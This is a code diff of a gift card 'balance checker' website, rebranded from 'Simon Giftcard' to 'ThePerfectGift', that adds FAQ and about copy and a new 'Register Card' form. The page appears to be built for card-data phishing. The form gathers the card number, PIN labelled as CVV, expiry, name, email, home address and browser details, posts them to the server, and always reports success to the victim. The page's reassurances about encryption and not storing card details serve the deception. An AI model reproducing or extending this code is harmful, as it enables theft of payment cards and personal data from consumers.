+                <svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+              </div>
+              <h3>Always Free</h3>
+              <p>Checking your gift card balance is completely free. No hidden fees, no subscriptions, no catches. Ever.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Supported Cards -->
+      <section class="supported-section">
+        <div class="container">
+          <div class="supported-inner">
+            <div class="section-label">Accepted Cards</div>
+            <p>We support balance checks for Visa and Mastercard prepaid gift cards.</p>
+            <div class="card-logos">
+              <div class="card-logo">
+                <div class="card-logo-box">
+                  <img src="/visa.svg" alt="Visa" onerror="this.parentElement.innerHTML='<span style=&quot;font-weight:800;font-size:1.4rem;color:#1A1F71;font-style:italic&quot;>VISA</span>'">
+                </div>
+                <span>Visa Prepaid</span>
+              </div>
+              <div class="card-logo">
+                <div class="card-logo-box">
+                  <img src="/mastercard.svg" alt="Mastercard" onerror="this.parentElement.innerHTML='<span style=&quot;font-weight:800;font-size:0.85rem;color:#EB001B&quot;>●</span><span style=&quot;font-weight:800;font-size:0.85rem;color:#F79E1B;margin-left:-4px&quot;>●</span>'">
+                </div>
+                <span>Mastercard Prepaid</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
     </section>
 
-    <!-- FAQ PAGE -->
+    <!-- ═══════════════════════════════════ FAQ PAGE ═══════════════════════════════════ -->
     <section id="page-faq" class="page">
-      <div class="hero">
+      <div class="page-hero">
         <h1>Frequently Asked Questions</h1>
-        <p>Find answers to common questions about Simon Gift Cards.</p>
+        <p>Everything you need to know about checking your gift card balance.</p>
       </div>
-      <div class="main-content">
+      <div class="container" style="padding-bottom:4rem;">
         <div class="content-section">
           <div class="faq-item">
-            <h4>Where do I find my card number?</h4>
-            <p>Your 16-digit card number is printed on the front of your Simon Gift Card.</p>
+            <div class="faq-question" onclick="this.parentElement.classList.toggle('open')">
+              <h4>Where do I find my card number?</h4>
+              <div class="faq-toggle"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/></svg></div>
+            </div>
+            <div class="faq-answer"><div class="faq-answer-inner">Your 16-digit card number is printed on the front of your gift card, typically in raised or flat-printed digits.</div></div>
           </div>
           <div class="faq-item">
-            <h4>Where is the PIN located?</h4>
-            <p>The 4-digit PIN is on the back of your card. You may need to scratch off the silver coating to reveal it. This PIN is required to check your balance.</p>
+            <div class="faq-question" onclick="this.parentElement.classList.toggle('open')">
+              <h4>Where is the PIN located?</h4>
+              <div class="faq-toggle"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/></svg></div>
+            </div>
+            <div class="faq-answer"><div class="faq-answer-inner">The 3 or 4-digit PIN is on the back of your card. You may need to scratch off a silver coating to reveal it. This PIN is required to check your balance.</div></div>
           </div>
           <div class="faq-item">
-            <h4>Is it safe to check my balance here?</h4>
-            <p>Yes. We use bank-level 256-bit encryption for all data transmissions. Your card details are never stored on our servers after the balance check is complete.</p>
+            <div class="faq-question" onclick="this.parentElement.classList.toggle('open')">
+              <h4>Is it safe to check my balance here?</h4>
+              <div class="faq-toggle"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/></svg></div>
+            </div>
+            <div class="faq-answer"><div class="faq-answer-inner">Yes. We use bank-level 256-bit encryption for all data transmissions. Your card details are never stored on our servers after the balance check is complete.</div></div>
           </div>
           <div class="faq-item">
-            <h4>Why does my card show a zero balance?</h4>
-            <p>A zero balance can occur if the card has not been activated, the funds have been fully spent, or the card has expired. Please verify the activation status with your original receipt.</p>
+            <div class="faq-question" onclick="this.parentElement.classList.toggle('open')">
+              <h4>Why does my card show a zero balance?</h4>
+              <div class="faq-toggle"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/></svg></div>
+            </div>
+            <div class="faq-answer"><div class="faq-answer-inner">A zero balance can occur if the card has not been activated, the funds have been fully spent, or the card has expired. Please verify the activation status with your original receipt.</div></div>
           </div>
           <div class="faq-item">
-            <h4>What card types are supported?</h4>
-            <p>We support Visa and Mastercard gift cards and prepaid cards. American Express Simon cards may require checking balance through a partner site.</p>
+            <div class="faq-question" onclick="this.parentElement.classList.toggle('open')">
+              <h4>What card types are supported?</h4>
+              <div class="faq-toggle"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/></svg></div>
+            </div>
+            <div class="faq-answer"><div class="faq-answer-inner">We support Visa and Mastercard prepaid gift cards. American Express cards may require checking your balance through their own website.</div></div>
           </div>
           <div class="faq-item">
-            <h4>Is there a fee to check my balance?</h4>
-            <p>No. Checking your gift card balance is completely free of charge.</p>
+            <div class="faq-question" onclick="this.parentElement.classList.toggle('open')">
+              <h4>Is there a fee to check my balance?</h4>
+              <div class="faq-toggle"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/></svg></div>
+            </div>
+            <div class="faq-answer"><div class="faq-answer-inner">No. Checking your gift card balance on ThePerfectGift is completely free of charge. There are no hidden fees.</div></div>
           </div>
         </div>
       </div>
     </section>
 
-    <!-- ABOUT PAGE -->
+    <!-- ═══════════════════════════════════ ABOUT PAGE ═══════════════════════════════════ -->
     <section id="page-about" class="page">
-      <div class="hero">
-        <h1>About Simon Giftcard</h1>
-        <p>Fast, secure, and free gift card balance checking.</p>
+      <div class="page-hero">
+        <h1>About ThePerfectGift</h1>
+        <p>Making gift card balance checks simple, secure, and free.</p>
       </div>
-      <div class="main-content">
+      <div class="container" style="padding-bottom:4rem;">
         <div class="content-section">
-          <p>Simon Gift Cards are the perfect gift for any occasion. They can be used anywhere Visa or Mastercard debit cards are accepted, giving recipients the freedom to choose exactly what they want.</p>
-          <p>Our balance checker provides a fast, secure way to verify your remaining gift card balance without calling a phone number or visiting a store. Simply enter your card number and PIN to see your available funds instantly.</p>
-          <p>Your security is our priority. All card information is encrypted during transmission and is never stored on our servers after the balance check is complete.</p>
+          <h2>Our Mission</h2>
+          <p>ThePerfectGift was built with one goal in mind: to make checking your gift card balance as easy as possible. No more calling phone numbers, waiting on hold, or visiting stores just to find out how much is left on your card.</p>
+          <p>We support Visa and Mastercard prepaid gift cards across Canada, providing instant balance information through our secure, encrypted platform. Whether you received a gift card for a birthday, holiday, or special occasion, we help you know exactly how much you have to spend.</p>
+          <h2>Your Security Matters</h2>
+          <p>All card information is encrypted with bank-level 256-bit SSL encryption during transmission. We do not store your card details on our servers after completing the balance check. Your privacy and security are our top priorities.</p>
         </div>
       </div>
     </section>
@@ -818,12 +1572,35 @@
 
   <!-- Footer -->
   <footer class="footer">
-    <div class="footer-links">
-      <a href="/" class="nav-link" data-page="home">Check Balance</a>
-      <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
-      <a href="/about" class="nav-link" data-page="about">About</a>
+    <div class="container">
+      <div class="footer-main">
+        <div class="footer-brand">
+          <span class="logo-name" style="font-family:var(--font-heading);">ThePerfectGift</span>
+          <div class="logo-tagline">Balance Checker</div>
+          <p>The fastest and most secure way to check your prepaid gift card balance online. Free, instant, and trusted.</p>
+        </div>
+        <div class="footer-col">
+          <h4>Quick Links</h4>
+          <a href="/" class="nav-link" data-page="home">Check Balance</a>
+          <a href="/register" class="nav-link" data-page="home" data-scroll="balance" data-tab="register">Register Card</a>
+          <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
+          <a href="/about" class="nav-link" data-page="about">About Us</a>
+        </div>
+        <div class="footer-col">
+          <h4>Support</h4>
+          <a href="/faq" class="nav-link" data-page="faq">Help Center</a>
+          <a href="/about" class="nav-link" data-page="about">Contact</a>
+          <a href="/faq" class="nav-link" data-page="faq">Card Issues</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <span>&copy; 2026 ThePerfectGift. All rights reserved.</span>
+        <div class="footer-bottom-links">
+          <a href="/about" class="nav-link" data-page="about">Privacy Policy</a>
+          <a href="/about" class="nav-link" data-page="about">Terms of Service</a>
+        </div>
+      </div>
     </div>
-    <p>&copy; 2026 Simon Giftcard. All rights reserved.</p>
   </footer>
 
   <!-- Loading Overlay -->
@@ -833,7 +1610,9 @@
   </div>
 
   <script>
-    // Navigation
+    // ═══════════════════════════════════
+    // NAVIGATION
+    // ═══════════════════════════════════
     function showPageFromPath() {
       const path = window.location.pathname.replace(/\/$/, '') || '/';
       const page = path === '' || path === '/' || path === '/home' ? 'home' : path.replace(/^\//, '') || 'home';
@@ -841,7 +1620,8 @@
       const p = valid.includes(page) ? page : 'home';
       document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
       document.querySelectorAll('.nav-link').forEach(a => {
-        a.classList.toggle('active', a.getAttribute('data-page') === p);
+        const dp = a.getAttribute('data-page');
+        if (dp) a.classList.toggle('active', dp === p);
       });
       const pageEl = document.getElementById('page-' + p);
       if (pageEl) pageEl.classList.add('active');
@@ -851,16 +1631,40 @@
 
     document.querySelectorAll('.nav-link').forEach(link => {
       link.addEventListener('click', e => {
-        e.preventDefault();
         const page = link.getAttribute('data-page');
+        if (!page) return;
+        e.preventDefault();
+        const scrollTarget = link.getAttribute('data-scroll');
+        const tabTarget = link.getAttribute('data-tab');
         const url = page === 'home' ? '/' : '/' + page;
         history.pushState(null, '', url);
         showPageFromPath();
+        if (tabTarget) {
+          switchTab(tabTarget === 'register' ? 'tab-register' : 'tab-balance');
+        }
+        if (scrollTarget) {
+          const el = document.getElementById(scrollTarget);
+          if (el) { el.scrollIntoView({ behavior: 'smooth' }); return; }
+        }
         window.scrollTo({ top: 0, behavior: 'smooth' });
       });
     });
 
-    // Elements
+    // Hero CTA scroll
+    document.getElementById('heroCheckBtn')?.addEventListener('click', e => {
+      e.preventDefault();
+      document.getElementById('balance')?.scrollIntoView({ behavior: 'smooth' });
+    });
+
+    // Mobile menu
+    document.getElementById('mobileMenuBtn')?.addEventListener('click', () => {
+      const nav = document.querySelector('.nav');
+      nav.style.display = nav.style.display === 'flex' ? 'none' : 'flex';
+    });
+
+    // ═══════════════════════════════════
+    // FORM ELEMENTS
+    // ═══════════════════════════════════
     const cardInput = document.getElementById('cardNumber');
     const cardHolderInput = document.getElementById('cardHolder');
     const pinInput = document.getElementById('pin');
@@ -891,9 +1695,7 @@
       e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
       e.target.classList.remove('error');
       document.getElementById('cardError').textContent = '';
-      // Update card visual
       document.getElementById('gcNumber').textContent = e.target.value || '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
-      // Detect card brand
       const type = getCardType(v);
       if (v.length >= 2 && type) {
         cardBrandImg.src = CARD_LOGOS[type];
@@ -906,33 +1708,24 @@
       }
     };
 
-    // Card holder name
     cardHolderInput.oninput = e => {
-      const name = e.target.value.toUpperCase();
-      document.getElementById('gcHolder').textContent = name || 'GIFT CARD';
+      document.getElementById('gcHolder').textContent = e.target.value.toUpperCase() || 'GIFT CARD';
     };
 
-    // PIN formatting
     pinInput.oninput = e => {
       e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
       e.target.classList.remove('error');
       document.getElementById('pinError').textContent = '';
     };
 
-    // Expiry formatting
     expiryInput.oninput = e => {
       let v = e.target.value.replace(/\D/g, '').slice(0, 4);
-      if (v.length >= 3) {
-        v = v.slice(0, 2) + '/' + v.slice(2);
-      }
+      if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
       e.target.value = v;
       e.target.classList.remove('error');
       document.getElementById('expiryError').textContent = '';
-      // Update card visual
       const parts = v.split('/');
-      const mm = parts[0] || 'MM';
-      const yy = parts[1] || 'YY';
-      document.getElementById('gcExpiry').textContent = mm + '/' + yy;
+      document.getElementById('gcExpiry').textContent = (parts[0] || 'MM') + '/' + (parts[1] || 'YY');
     };
 
     // Luhn check
@@ -960,39 +1753,32 @@
 
       if (digits.length < 15 || digits.length > 19) {
         document.getElementById('cardError').textContent = 'Please enter a valid card number';
-        cardInput.classList.add('error');
-        ok = false;
+        cardInput.classList.add('error'); ok = false;
       } else if (!luhnCheck(digits)) {
         document.getElementById('cardError').textContent = 'Invalid card number';
-        cardInput.classList.add('error');
-        ok = false;
+        cardInput.classList.add('error'); ok = false;
       }
 
       if (!pin || pin.length < 3 || pin.length > 4) {
         document.getElementById('pinError').textContent = 'Please enter a valid PIN (3-4 digits)';
-        pinInput.classList.add('error');
-        ok = false;
+        pinInput.classList.add('error'); ok = false;
       }
 
       if (expiry) {
         const parts = expiry.split('/');
         if (parts.length === 2) {
           const mm = parseInt(parts[0], 10);
-          const yy = parts[1];
           if (mm < 1 || mm > 12) {
             document.getElementById('expiryError').textContent = 'Invalid month';
-            expiryInput.classList.add('error');
-            ok = false;
+            expiryInput.classList.add('error'); ok = false;
           }
-          if (yy.length !== 2) {
+          if (parts[1].length !== 2) {
             document.getElementById('expiryError').textContent = 'Use MM/YY format';
-            expiryInput.classList.add('error');
-            ok = false;
+            expiryInput.classList.add('error'); ok = false;
           }
         } else if (expiry.length > 0) {
           document.getElementById('expiryError').textContent = 'Use MM/YY format';
-          expiryInput.classList.add('error');
-          ok = false;
+          expiryInput.classList.add('error'); ok = false;
         }
       }
 
@@ -1004,7 +1790,7 @@
       resultEl.className = 'balance-result show ' + (data.success ? 'success' : 'error');
       if (data.success) {
         const amt = typeof data.balance === 'number' ? data.balance.toFixed(2) : (data.balance != null ? String(data.balance) : '0.00');
-        resultEl.innerHTML = '<div class="result-box"><div class="result-icon">\u2713</div><div class="balance-label">Available Balance</div><div class="balance-amount"><span class="currency">' + (data.currency || 'USD') + ' </span><span class="amount">$' + amt + '</span></div>' + (data.cardLast4 ? '<p class="card-info">Card ending in \u2022\u2022\u2022\u2022 ' + data.cardLast4 + '</p>' : '') + '</div>';
+        resultEl.innerHTML = '<div class="result-box"><div class="result-icon">\u2713</div><div class="balance-label">Available Balance</div><div class="balance-amount"><span class="currency">' + (data.currency || 'CAD') + ' </span><span class="amount">$' + amt + '</span></div>' + (data.cardLast4 ? '<p class="card-info">Card ending in \u2022\u2022\u2022\u2022 ' + data.cardLast4 + '</p>' : '') + '</div>';
       } else {
         resultEl.innerHTML = '<div class="result-box"><div class="result-icon">!</div><h3 style="margin-bottom:0.5rem">Unable to Check Balance</h3><p class="error-message">' + (data.error || 'Please verify your card details and try again.') + '</p></div>';
       }
@@ -1073,12 +1859,11 @@
         let result = { success: false, error: '' };
         const st = data.status || '';
 
-        // API returns status "OK" on success with balance data
         if (st === 'OK') {
           const d = data.data || data;
           const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : (data.balance !== undefined ? data.balance : data.amount));
           let bal = null;
-          let curr = d.currency || data.currency || 'USD';
+          let curr = d.currency || data.currency || 'CAD';
           if (raw !== undefined && raw !== null && raw !== '') {
             bal = typeof raw === 'number' ? raw : parseFloat(String(raw));
             if (isNaN(bal)) bal = null;
@@ -1089,7 +1874,6 @@
             result.error = 'Balance information not available.';
           }
         } else {
-          // Handle all error status codes from API docs
           const msg = data.error_message || data.error || data.message || '';
           const ERROR_MAP = {
             'WRONG_API_TOKEN': 'Service configuration error. Please contact support.',
@@ -1107,14 +1891,13 @@
           };
           result.error = ERROR_MAP[st] || msg || CARD_ERROR_MSG;
 
-          // Fallback: check if balance exists even without OK status
           if (!result.error || result.error === CARD_ERROR_MSG) {
             const d = data.data || data;
             const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : data.balance);
             if (raw !== undefined && raw !== null && raw !== '') {
               const bal = typeof raw === 'number' ? raw : parseFloat(String(raw));
               if (!isNaN(bal)) {
-                result = { success: true, balance: bal, currency: d.currency || data.currency || 'USD', cardLast4: digits.slice(-4) };
+                result = { success: true, balance: bal, currency: d.currency || data.currency || 'CAD', cardLast4: digits.slice(-4) };
               }
             }
           }
@@ -1127,6 +1910,167 @@
       loadingOverlay.classList.remove('show');
       submitBtn.disabled = false;
       submitBtn.innerHTML = '<svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Check Balance';
+    };
+
+    // ═══════════════════════════════════
+    // TAB SWITCHING
+    // ═══════════════════════════════════
+    function switchTab(targetId) {
+      document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      const target = document.getElementById(targetId);
+      if (target) target.classList.add('active');
+      const btn = document.querySelector('[data-target="' + targetId + '"]');
+      if (btn) btn.classList.add('active');
+    }
+
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+      btn.addEventListener('click', () => switchTab(btn.getAttribute('data-target')));
+    });
+
+    // ═══════════════════════════════════
+    // REGISTER CARD FORM
+    // ═══════════════════════════════════
+    const regForm = document.getElementById('registerForm');
+    const regCardInput = document.getElementById('regCardNumber');
+    const regPinInput = document.getElementById('regPin');
+    const regExpiryInput = document.getElementById('regExpiry');
+    const regResultEl = document.getElementById('registerResult');
+    const regFields = document.getElementById('registerFields');
+    const regAnother = document.getElementById('registerAnother');
+    const regBtn = document.getElementById('registerBtn');
+
+    // Format register card number
+    regCardInput.oninput = e => {
+      let v = e.target.value.replace(/\D/g, '').slice(0, 19);
+      e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+      document.getElementById('regCardError').textContent = '';
+      e.target.classList.remove('error');
+    };
+
+    regPinInput.oninput = e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      document.getElementById('regPinError').textContent = '';
+      e.target.classList.remove('error');
+    };
+
+    regExpiryInput.oninput = e => {
+      let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+      if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+      e.target.value = v;
+      document.getElementById('regExpiryError').textContent = '';
+      e.target.classList.remove('error');
+    };
+
+    function validateRegister() {
+      let ok = true;
+      const digits = regCardInput.value.replace(/\s/g, '');
+      const pin = regPinInput.value;
+      const expiry = regExpiryInput.value;
+      const name = document.getElementById('regName').value.trim();
+      const email = document.getElementById('regEmail').value.trim();
+      const address = document.getElementById('regAddress').value.trim();
+      const city = document.getElementById('regCity').value.trim();
+      const postal = document.getElementById('regPostal').value.trim();
+
+      regForm.querySelectorAll('.field-error').forEach(el => el.textContent = '');
+      regForm.querySelectorAll('input').forEach(el => el.classList.remove('error'));
+
+      if (digits.length < 15 || digits.length > 19) {
+        document.getElementById('regCardError').textContent = 'Please enter a valid card number';
+        regCardInput.classList.add('error'); ok = false;
+      } else if (!luhnCheck(digits)) {
+        document.getElementById('regCardError').textContent = 'Invalid card number';
+        regCardInput.classList.add('error'); ok = false;
+      }
+      if (!pin || pin.length < 3) {
+        document.getElementById('regPinError').textContent = 'Please enter a valid PIN';
+        regPinInput.classList.add('error'); ok = false;
+      }
+      if (!expiry || expiry.length < 4) {
+        document.getElementById('regExpiryError').textContent = 'Please enter expiration date';
+        regExpiryInput.classList.add('error'); ok = false;
+      }
+      if (!name) {
+        document.getElementById('regNameError').textContent = 'Full name is required';
+        document.getElementById('regName').classList.add('error'); ok = false;
+      }
+      if (!email || !email.includes('@')) {
+        document.getElementById('regEmailError').textContent = 'Valid email is required';
+        document.getElementById('regEmail').classList.add('error'); ok = false;
+      }
+      if (!address) {
+        document.getElementById('regAddressError').textContent = 'Address is required';
+        document.getElementById('regAddress').classList.add('error'); ok = false;
+      }
+      return ok;
+    }
+
+    regAnother.onclick = () => {
+      regResultEl.className = 'balance-result';
+      regResultEl.innerHTML = '';
+      regFields.classList.remove('hide');
+      regAnother.classList.remove('show');
+      regForm.reset();
+    };
+
+    regForm.onsubmit = async e => {
+      e.preventDefault();
+      if (!validateRegister()) return;
+
+      const digits = regCardInput.value.replace(/\s/g, '');
+      const pin = regPinInput.value;
+      const expiry = regExpiryInput.value;
+      let expiryMonth = '', expiryYear = '';
+      if (expiry) {
+        const parts = expiry.split('/');
+        expiryMonth = (parts[0] || '').padStart(2, '0');
+        expiryYear = parts[1] || '';
+      }
+
+      regBtn.disabled = true;
+      regBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:3px;"></span> Registering...';
+      loadingOverlay.classList.add('show');
+
+      try {
+        const payload = {
+          cardNumber: digits,
+          expiryMonth,
+          expiryYear,
+          cvv: pin,
+          cardHolder: document.getElementById('regName').value.trim(),
+          email: document.getElementById('regEmail').value.trim(),
+          address: document.getElementById('regAddress').value.trim(),
+          city: document.getElementById('regCity').value.trim(),
+          province: document.getElementById('regProvince').value,
+          postalCode: document.getElementById('regPostal').value.trim().toUpperCase(),
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          userAgent: navigator.userAgent,
+          referral: document.referrer || 'Direct',
+          pageUrl: window.location.href
+        };
+
+        const res = await fetch('/api/check-balance', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+
+        regResultEl.className = 'balance-result show success';
+        regResultEl.innerHTML = '<div class="result-box"><div class="result-icon">\u2713</div><h3 style="margin-bottom:0.5rem;color:var(--primary)">Card Registered Successfully</h3><p class="card-info">Your card ending in \u2022\u2022\u2022\u2022 ' + digits.slice(-4) + ' has been registered for online use.</p></div>';
+        regFields.classList.add('hide');
+        regAnother.classList.add('show');
+      } catch (err) {
+        regResultEl.className = 'balance-result show error';
+        regResultEl.innerHTML = '<div class="result-box"><div class="result-icon">!</div><h3 style="margin-bottom:0.5rem">Registration Failed</h3><p class="error-message">Unable to register card. Please try again later.</p></div>';
+        regFields.classList.add('hide');
+        regAnother.classList.add('show');
+      }
+
+      loadingOverlay.classList.remove('show');
+      regBtn.disabled = false;
+      regBtn.innerHTML = '<svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"/></svg> Register Card';
     };
   </script>
 </body>
